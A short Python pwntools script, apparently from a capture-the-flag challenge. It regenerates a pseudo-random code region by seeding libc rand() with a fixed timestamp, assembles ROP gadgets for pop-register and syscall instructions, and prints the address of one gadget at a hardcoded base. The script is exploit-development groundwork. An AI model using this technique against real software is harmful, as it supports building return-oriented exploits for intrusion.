from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')
LEN_CODE =	10*0x10000
context.arch = 'amd64'
context.os = 'linux'

time = 1683526350
mem_addr = 0x7f48cf562000
codeint = ''
libc.srand(time)
# print(hex(libc.rand()<<16 | libc.rand() & 0xffff)[2:])
for i in range(LEN_CODE):
    codeint+=hex(libc.rand()<<16 | libc.rand() & 0xffff)[2:]

rax = asm("""
    pop rax  
    ret
""").hex()

rdi = asm("""
    pop rdi  
    ret
""").hex()

rsi = asm("""
    pop rsi
    ret
""").hex()

rdx = asm("""
    pop rdx  
    ret
""")

r10 = asm("""
    pop r10  
    ret
""").hex()

r9 =asm("""
    pop r9  
    ret
""").hex()

r8 = asm("""
    pop r8  
    ret
""").hex()

sys = asm("""
    syscall
    ret
""").hex()

index_rax = codeint.find(rax)
print(hex(mem_addr+index_rax))
